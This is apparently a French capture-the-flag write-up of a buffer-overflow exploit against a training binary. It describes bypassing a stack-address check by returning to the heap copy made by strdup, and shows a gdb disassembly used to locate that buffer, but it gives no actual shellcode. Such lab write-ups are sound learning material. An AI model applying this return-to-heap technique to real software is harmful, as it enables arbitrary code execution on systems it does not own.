Type of attack : ret2reg
http://slayne.github.io/2016/02/17/stack7/
https://beta.hackndo.com/retour-a-la-libc/

Solution:
	1.On test avec un buffer overflow normale sur l'appel de get, eip est bien écrasé mais le programme exit si l'adresse de retour du get est dans la stack
	2.On cherche donc une autre solution: le strdup qui prends un buffer et retour l'adresse à laquel il le copie
	3.On cherche donc l'adresse ou il va copier notre buffer sachant le le randomize des adresse est desactiver elle sera tjr pareil
	4.On lance l'exploit et bim


Shellcode size = 56 bytes

**find strdup buffer adresse**
input = "AAAAAAAA" >> 0x41414141...
(gdb) b *0x0804853d
(gdb) r
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
=> 0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
(gdb) i r eax
eax            0x804a008	134520840
(gdb) x/xw 0x804a008
0x804a008:	0x41414141        (ici on voit nos 'A' c'est donc bien le début du notre buffer)
(gdb)